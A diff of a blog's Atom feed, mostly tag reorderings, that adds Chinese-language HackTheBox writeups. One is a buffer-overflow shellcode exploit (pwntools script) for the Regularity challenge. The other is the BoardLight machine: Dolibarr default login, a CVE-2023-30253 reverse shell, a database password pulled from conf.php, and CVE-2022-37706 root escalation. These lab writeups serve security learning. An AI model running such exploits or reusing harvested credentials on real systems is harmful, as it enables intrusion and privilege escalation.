@@ -6,7 +6,7 @@
   <link href="https://kazma.tw/atom.xml" rel="self"/>
   
   <link href="https://kazma.tw/"/>
-  <updated>2024-08-11T07:21:45.630Z</updated>
+  <updated>2024-08-11T09:18:50.900Z</updated>
   <id>https://kazma.tw/</id>
   
   <author>
@@ -21,7 +21,7 @@
     <link href="https://kazma.tw/2024/08/11/HackTheBox-Challenges-Regularity-Writeup/"/>
     <id>https://kazma.tw/2024/08/11/HackTheBox-Challenges-Regularity-Writeup/</id>
     <published>2024-08-11T03:37:47.245Z</published>
-    <updated>2024-08-11T07:21:45.630Z</updated>
+    <updated>2024-08-11T09:18:50.900Z</updated>
     
     <content type="html"><![CDATA[<h2 id="Brief-Intro"><a href="#Brief-Intro" class="headerlink" title="Brief Intro"></a>Brief Intro</h2><p>因為剛打完 machines 就很好奇 HackTheBox 的 Challeges 是什麼，所以跑來玩玩看，感覺就是 CTF ?</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>這題蠻簡單的，什麼保護都沒開：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec regularity</span><br><span class="line">[*] Checking <span class="keyword">for</span> new versions of pwntools</span><br><span class="line">    To <span class="built_in">disable</span> this functionality, <span class="built_in">set</span> the contents of /home/kazmatw/.cache/.pwntools-cache-3.11/update to <span class="string">&#x27;never&#x27;</span> (old way).</span><br><span class="line">    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):</span><br><span class="line">        [update]</span><br><span class="line">        interval=never</span><br><span class="line">[*] You have the latest version of Pwntools (4.12.0)</span><br><span class="line">[*] <span class="string">&#x27;/home/kazmatw/regularity&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div><p>程式很簡單，有一個 bof：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040104B ; signed __int64 read()</span><br><span class="line">.text:000000000040104B read            proc near               ; CODE XREF: _start+19↑p</span><br><span class="line">.text:000000000040104B</span><br><span class="line">.text:000000000040104B buf             = byte ptr -100h</span><br><span class="line">.text:000000000040104B</span><br><span class="line">.text:000000000040104B                 sub     rsp, 100h</span><br><span class="line">.text:0000000000401052                 mov     eax, 0</span><br><span class="line">.text:0000000000401057                 mov     edi, 0          ; fd</span><br><span class="line">.text:000000000040105C                 lea     rsi, [rsp+100h+buf] ; buf</span><br><span class="line">.text:0000000000401060                 mov     edx, 110h       ; count</span><br><span class="line">.text:0000000000401065                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:0000000000401067                 add     rsp, 100h</span><br><span class="line">.text:000000000040106E                 retn</span><br><span class="line">.text:000000000040106E read            endp</span><br></pre></td></tr></table></figure></div><p>輸入 0x110 到 0x100 的 buffer，足夠我們覆蓋到 return。<br>那我們就可以在 stack 上寫 shellcode 然後 return 回 buffer 開始的位置也就是 shellcode 的位置，那剛好從上面可以看到是 rsi，又剛好前面程式有用到這個 gadget：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401000 ; void __noreturn start()</span><br><span class="line">.text:0000000000401000                 public _start</span><br><span class="line">.text:0000000000401000 _start          proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:0000000000401000                                         ; LOAD:0000000000400088↑o</span><br><span class="line">.text:0000000000401000                 mov     edi, 1</span><br><span class="line">.text:0000000000401005                 mov     rsi, offset message1</span><br><span class="line">.text:000000000040100F                 mov     edx, 2Ah ; &#x27;*&#x27;</span><br><span class="line">.text:0000000000401014                 call    write</span><br><span class="line">.text:0000000000401019                 call    read</span><br><span class="line">.text:000000000040101E                 mov     edi, 1</span><br><span class="line">.text:0000000000401023                 mov     rsi, offset message3</span><br><span class="line">.text:000000000040102D                 mov     edx, 27h ; &#x27;&#x27;&#x27;</span><br><span class="line">.text:0000000000401032                 call    write</span><br><span class="line">.text:0000000000401037                 mov     rsi, offset exit</span><br><span class="line">.text:0000000000401041                 jmp     rsi</span><br><span class="line">.text:0000000000401041 _start          endp</span><br></pre></td></tr></table></figure></div><p>所以跳回 0x401041 <code>jmp rsi</code>。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">r = remote(<span class="string">&quot;94.237.53.113&quot;</span>, <span class="number">45254</span>)</span><br><span class="line"></span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line">jmp_rsi = <span class="number">0x401041</span></span><br><span class="line">p = flat(sc, <span class="string">b&quot;a&quot;</span> * (<span class="number">0x100</span> - <span class="built_in">len</span>(sc)), jmp_rsi)</span><br><span class="line"></span><br><span class="line">r.send(p)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/regularity.png"                      alt="pwn"                ></p>]]></content>
     
@@ -34,17 +34,46 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
     
     <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
     
     <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
     
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
+    
     <category term="ret2reg" scheme="https://kazma.tw/tags/ret2reg/"/>
     
     <category term="shellcode" scheme="https://kazma.tw/tags/shellcode/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>HackTheBox-Machines BoardLight Writeup</title>
+    <link href="https://kazma.tw/2024/08/11/HackTheBox-Machines-BoardLight-Writeup/"/>
+    <id>https://kazma.tw/2024/08/11/HackTheBox-Machines-BoardLight-Writeup/</id>
+    <published>2024-08-11T03:36:19.705Z</published>
+    <updated>2024-08-11T12:41:35.764Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>一樣先做基本的掃描：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ nmap -sV 10.10.11.11</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 06:53 CDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.11</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 12.76 seconds</span><br></pre></td></tr></table></figure></div><p>看起來有網頁服務跟 ssh，用 <code>whatweb</code> 可以看網頁資訊：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ whatweb 10.10.11.11</span><br><span class="line">http://10.10.11.11 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[info@board.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.11], JQuery[3.4.1], Script[text/javascript], X-UA-Compatible[IE=edge]</span><br></pre></td></tr></table></figure></div><p>順便加到 &#x2F;etc&#x2F;hosts</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.11.11 board.htb&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br><span class="line">10.10.11.11 board.htb</span><br></pre></td></tr></table></figure></div><p>接著可以掃 subdomain：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ ffuf -u http://board.htb -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H <span class="string">&quot;Host:FUZZ.board.htb&quot;</span> -fw 6243 </span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://board.htb</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.board.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response words: 6243</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 380ms]</span></span><br></pre></td></tr></table></figure></div><p>可以看到有個 crm 的 subdomain，我們也把他加到 &#x2F;etc&#x2F;hosts</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.11.11 crm.board.htb&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br><span class="line">10.10.11.11 crm.board.htb</span><br></pre></td></tr></table></figure></div><p>用瀏覽器訪問 crm.board.htb 會看到一個登入頁面：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/light_login.png"                      alt="login"                ><br>看到 title 是 Dolibarr，上網查一下：</p><blockquote><p>Dolibarr ERP CRM is an open source, free software package for companies of any size, foundations or freelancers. It includes different features for enterprise resource planning (ERP) and customer relationship management (CRM) but also other features for different activities.<br>總之就是一個開源給企業的 ERP + CRM。<br>我們同時搜尋一下他的 default password：<br>Login&#x2F;password of Dolibarr ERP &amp; CRM: - If you did not change it, login is admin and password is the same than the one sent by email for your dashboard access, once your instance was created. Take a look into your message box to retreive it. EMail topic should start with “Welcome to Dolicloud”.<br>結果就順利用 default password 滑進去了。<br>那同時也搜尋一下 Dolibarr 17.0.0 有沒有已知漏洞，結果當然是有的：<br><a class="link"   href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253" >https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ python exploit.py -h</span><br><span class="line">usage: python3 exploit.py &lt;TARGET_HOSTNAME&gt; &lt;USERNAME&gt; &lt;PASSWORD&gt; &lt;LHOST&gt; &lt;LPORT&gt;</span><br><span class="line">example: python3 exploit.py http://example.com login password 127.0.0.1 9001</span><br><span class="line"></span><br><span class="line">---[Reverse Shell Exploit <span class="keyword">for</span> Dolibarr &lt;= 17.0.0 (CVE-2023-30253)]---</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  hostname    Target hostname</span><br><span class="line">  username    Username of Dolibarr ERP/CRM</span><br><span class="line">  password    Password of Dolibarr ERP/CRM</span><br><span class="line">  lhost       Listening host <span class="keyword">for</span> reverse shell</span><br><span class="line">  lport       Listening port <span class="keyword">for</span> reverse shell</span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --<span class="built_in">help</span>  show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">┌─[sg-vip-2]─[10.10.14.22]─[kazma@htb-jejtlehtvs]─[~/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253]</span><br><span class="line">└──╼ [★]$ python3 exploit.py http://crm.board.htb admin admin 10.10.14.22 4444</span><br><span class="line">[*] Trying authentication...</span><br><span class="line">[**] Login: admin</span><br><span class="line">[**] Password: admin</span><br><span class="line">[*] Trying created site...</span><br><span class="line">[*] Trying created page...</span><br><span class="line">[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection</span><br></pre></td></tr></table></figure></div><p>Reverse shell：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ nc -nlvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.14.22] from (UNKNOWN) [10.10.11.11] 44222</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (893): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$</span><br></pre></td></tr></table></figure></div><p>拿到 shell 後我們一樣先換 bash，然後我們上網搜尋一下 Dolibarr 的設定檔放在哪個位置：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/light_conf.png"                      alt="conf"                ><br>讚讚讚，我們來找找 conf&#x2F;conf.php，裡面應該會有 db_pass：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">www-data@boardlight:/$ find /var -name <span class="string">&quot;conf.php&quot;</span> 2&gt;/dev/null</span><br><span class="line">find /var -name <span class="string">&quot;conf.php&quot;</span> 2&gt;/dev/null</span><br><span class="line">/var/www/html/crm.board.htb/htdocs/conf/conf.php</span><br><span class="line">www-data@boardlight:/$ <span class="built_in">cat</span> /var/www/html/crm.board.htb/htdocs/conf/conf.php | grep db_pass</span><br><span class="line">&lt;l/crm.board.htb/htdocs/conf/conf.php | grep db_pass</span><br><span class="line"><span class="variable">$dolibarr_main_db_pass</span>=<span class="string">&#x27;serverfun2$2023!!&#x27;</span>;</span><br><span class="line">拿到 user password 了，我們嘗試切換到 user：</span><br><span class="line">```bash</span><br><span class="line">www-data@boardlight:/$ su larissa</span><br><span class="line">su larissa</span><br><span class="line">Password: serverfun2<span class="variable">$2023</span>!!</span><br><span class="line"></span><br><span class="line">larissa@boardlight:/$ <span class="built_in">cd</span> ~   </span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">larissa@boardlight:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">Desktop    Downloads  Pictures  Templates  Videos</span><br><span class="line">Documents  Music      Public    user.txt</span><br></pre></td></tr></table></figure></div><p>順利登入！那我們直接用 ssh 登入 larissa 的帳號，同時我們檢查一下 SUID 可以發現 enlightenment 有給 SUID：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ ssh larissa@10.10.11.11</span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.11.11 (10.10.11.11)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:xngtcDPqg6MrK72I6lSp/cKgP2kwzG6rx2rlahvu/v0.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.11.11<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">larissa@10.10.11.11&#x27;</span>s password: </span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">larissa@boardlight:~$ find / -perm /u=s 2&gt;/dev/null</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/xorg/Xorg.wrap</span><br><span class="line">/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys</span><br><span class="line">/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd</span><br><span class="line">/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight</span><br><span class="line">/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/sbin/pppd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/vmware-user-suid-wrapper</span><br></pre></td></tr></table></figure></div><p>那我們接著可以上網查詢相關的 exploit：<br><a class="link"   href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit" >https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">larissa@boardlight:~$ vi exploit.sh</span><br><span class="line">larissa@boardlight:~$ <span class="built_in">chmod</span> +x exploit.sh </span><br><span class="line">larissa@boardlight:~$ ./exploit.sh </span><br><span class="line">CVE-2022-37706</span><br><span class="line">[*] Trying to find the vulnerable SUID file...</span><br><span class="line">[*] This may take few seconds...</span><br><span class="line">[+] Vulnerable SUID binary found!</span><br><span class="line">[+] Trying to pop a root shell!</span><br><span class="line">[+] Enjoy the root shell :)</span><br><span class="line">mount: /dev/../tmp/: can<span class="string">&#x27;t find in /etc/fstab.</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># find / -name &quot;root.txt&quot;</span></span><br><span class="line"><span class="string">/root/root.txt</span></span><br></pre></td></tr></table></figure></div><p>我們把 exploit 用 vi 寫進去，給上執行權限，執行後就可以順利一鍵提權！</p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/light_pwn.png"                      alt="pwn"                ></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;一樣先做基本的掃描：&lt;/p&gt;
+&lt;div class=&quot;hig</summary>
+      
+    
+    
+    
+    
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
+    
+    <category term="machines" scheme="https://kazma.tw/tags/machines/"/>
+    
+    <category term="pt" scheme="https://kazma.tw/tags/pt/"/>
     
   </entry>
   
@@ -122,9 +151,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
     
@@ -152,9 +181,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
     
@@ -182,9 +211,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
     
@@ -214,9 +243,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
     
@@ -244,9 +273,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="shellcode" scheme="https://kazma.tw/tags/shellcode/"/>
     
@@ -272,9 +301,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
     
@@ -302,9 +331,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
     
@@ -334,9 +363,9 @@
     
     
     
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
-    
     <category term="tools" scheme="https://kazma.tw/tags/tools/"/>
+    
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="angr" scheme="https://kazma.tw/tags/angr/"/>
     
@@ -412,9 +441,9 @@
     
     
     
-    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
-    
     <category term="tools" scheme="https://kazma.tw/tags/tools/"/>
+    
+    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
     
     <category term="angr" scheme="https://kazma.tw/tags/angr/"/>
     
@@ -438,9 +467,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="pwnabletw" scheme="https://kazma.tw/tags/pwnabletw/"/>
     
@@ -468,9 +497,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="tools" scheme="https://kazma.tw/tags/tools/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="notes" scheme="https://kazma.tw/tags/notes/"/>
     
@@ -522,9 +551,9 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
     <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
+    
+    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
     
     <category term="rop" scheme="https://kazma.tw/tags/rop/"/>
     
@@ -553,39 +582,11 @@
     
     
     
-    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
-    
